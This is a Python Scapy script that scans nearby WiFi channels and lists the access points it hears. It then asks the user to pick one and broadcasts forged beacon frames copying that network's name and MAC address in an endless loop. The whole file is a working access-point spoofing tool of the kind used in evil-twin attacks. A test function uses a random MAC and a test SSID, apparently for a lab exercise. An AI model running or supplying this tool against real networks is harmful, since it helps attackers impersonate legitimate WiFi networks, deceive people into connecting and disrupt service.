#!/usr/bin/env python

# https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/

from scapy.all import (
    Dot11,
    Dot11Beacon,
    Dot11Elt,
    RadioTap,
    sendp,
    hexdump,
)

DEFAULT_IFACE = "wlan0mon"
net_ssid = 'testSSID' #Network name here

def beacon(net_ssid, bssid, iface=DEFAULT_IFACE, inter=0.100):
    dot11 = Dot11(
        type=0,                         # To indicate the frame is a management frame (type 0).
        subtype=8,                      # To indicate the management frames subtype is a beacon (type 8).
        addr1="ff:ff:ff:ff:ff:ff",      # Destination MAC address.  => We need to broadcast             
        addr2=bssid,                    # Source MAC address of sender.                  
        addr3=bssid,                    # MAC address of Access Point.                    
    )
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID',info=net_ssid, len=len(net_ssid))
    rsn = Dot11Elt(ID='RSNinfo', info=(
        '\x01\x00'              # RSN Version 1
        '\x00\x0f\xac\x02'      # Group Cipher Suite : 00-0f-ac TKIP
        '\x02\x00'              # 2 Pairwise Cipher Suites (next two lines)
        '\x00\x0f\xac\x04'      # AES Cipher
        '\x00\x0f\xac\x02'      # TKIP Cipher
        '\x01\x00'              # 1 Authentication Key Managment Suite (line below)
        '\x00\x0f\xac\x02'      # Pre-Shared Key
        '\x00\x00'              # RSN Capabilities (no extra capabilities)
    )) 


    frame = RadioTap()/dot11/beacon/essid/rsn

    frame.show()
    print("\nHexDump of frame:")
    hexdump(frame)
    input("\nPress enter to start\n")
    sendp(frame, iface=iface, inter=inter, loop=1)


# END of beacon spoofing
# ====================================================================================================
# START definition of AP dataclass

from dataclasses import dataclass
@dataclass
class AP:
    bssid: str
    ssid: str
    channel: str
    crypto: str
    power: str
    rsn: str
    def __hash__(self) -> int:
        return hash(self.bssid)
    def __eq__(self, other) -> bool:
        return self.bssid == other.bssid
    def spoof(self, iface=DEFAULT_IFACE, inter=0.100):
        return beacon(self.ssid, self.bssid, iface=iface, inter=inter)

# END definition of AP dataclass
# ====================================================================================================
# START of AP selection

from scapy.all import (
    sniff,
    Dot11EltRSN,
)
import os


# Lots of formatting variables, don't worry about those
INDEX_COL_WIDTH = 6
BSSID_COL_WIDTH = 18
SSID_COL_WIDTH = 25
CHANNEL_COL_WIDTH = 8
CRYPTO_COL_WIDTH = 25
POWER_COL_WIDTH = 12
ARRAY_WIDTH = INDEX_COL_WIDTH + BSSID_COL_WIDTH + SSID_COL_WIDTH + CHANNEL_COL_WIDTH + CRYPTO_COL_WIDTH + POWER_COL_WIDTH + 17

def _print_ap_table_line(index, ap):
    print(
        str(index).ljust(INDEX_COL_WIDTH, ' '), "|",
        ap.bssid.ljust(BSSID_COL_WIDTH, ' '),"|",
        ap.ssid.ljust(SSID_COL_WIDTH, ' '),"|",
        str(ap.channel).ljust(CHANNEL_COL_WIDTH, ' '),"|",
        str(ap.crypto).ljust(CRYPTO_COL_WIDTH, ' '),"|",
        str(ap.power).ljust(POWER_COL_WIDTH, ' '),"|"
    )

def display_ap_table(ap_list):
    _print_ap_table_line(
        "", AP(
            "BSSID",
            "SSID",
            "Channel",
            "Crypto",
            "Power [dBm]",
            "",  # RSN
        )
    )
    print('-' * ARRAY_WIDTH)
    for index, ap in enumerate(ap_list):
        _print_ap_table_line(index, ap)

def ask_ap_to_spoof(ap_list):
    print("Which SSID do you want to spoof ? ")
    display_ap_table(ap_list)
    chosen = -1
    while chosen not in range(0, len(ap_list)):
        try:
            chosen = int(input("Choose SSID: "))
        except Exception:
            chosen = -1
    return ap_list[chosen]

# END of AP selection
# ====================================================================================================
# START of AP discovery

def change_channel(interface, channel):
    os.system("iw dev %s set channel %d" %(interface, channel))

def find_app(iface=DEFAULT_IFACE, count=10, channels=None):
    AP_LIST = set()

    # Callback function to use on each sniffed packet
    # Source: https://www.thepythoncode.com/article/building-wifi-scanner-in-python-scapy
    def callback(pkt, AP_LIST=AP_LIST):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            ssid = pkt[Dot11Elt].info.decode()
            rsn = pkt[Dot11EltRSN].info
            try:
                dbm_signal = pkt.dBm_AntSignal
            except:
                dbm_signal = "N/A"
            stats = pkt[Dot11Beacon].network_stats()
            channel = stats.get("channel")
            crypto = stats.get("crypto")

            wifi = AP(bssid, ssid, channel, crypto, dbm_signal, rsn)
            AP_LIST.add(wifi)

    # Sniff only as long as packet_count
    channels = channels or list(range(1, 12))
    for channel in channels:
        print(f'Scanning channel {channel} for SSIDs')
        sniff(iface=iface, prn = callback, count = count)
        channel = change_channel(iface, channel)
    return list(AP_LIST)

# END of AP discovery
# ====================================================================================================
# START of script parameters management

import argparse
def handle_arguments():
    # Argument parsing
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface")
    parser.add_argument("-c", "--channels")
    parser.add_argument("-p", "--packet-count")
    args = parser.parse_args()

    # Variables to contain argument values
    interface = ""
    packet_count = ""

    # Get inteface name from args
    if args.interface == None:
        print("[WARN] No interface specified, defaulting to wlan0mon")
        interface = DEFAULT_IFACE
    else:
        interface = args.interface

    # Get packet_count for sniffing duration from args
    if args.packet_count == None:
        print("[WARN] No packet count for sniffing defined, defaulting to 10")
        packet_count = 10
    else:
        packet_count = int(args.packet_count)
    channels = args.channels or None
    if channels:
        channels = list({int(i) for i in channels.split(",")})
    return interface, packet_count, channels

# END of script parameters management
# ====================================================================================================
from scapy.all import (
    RandMAC
)

def main():
    interface, packet_count, channels = handle_arguments()
    AP_LIST = find_app(interface, packet_count, channels)
    target = ask_ap_to_spoof(AP_LIST)
    target.spoof(interface)

def test():
    interface, packet_count, channels = handle_arguments()
    AP_LIST = find_app(interface, packet_count, channels)
    target = ask_ap_to_spoof(AP_LIST)
    target.ssid = "test SWI"
    target.bssid = RandMAC()
    print(target.bssid)
    target.spoof(interface)


if __name__ == "__main__":
    test()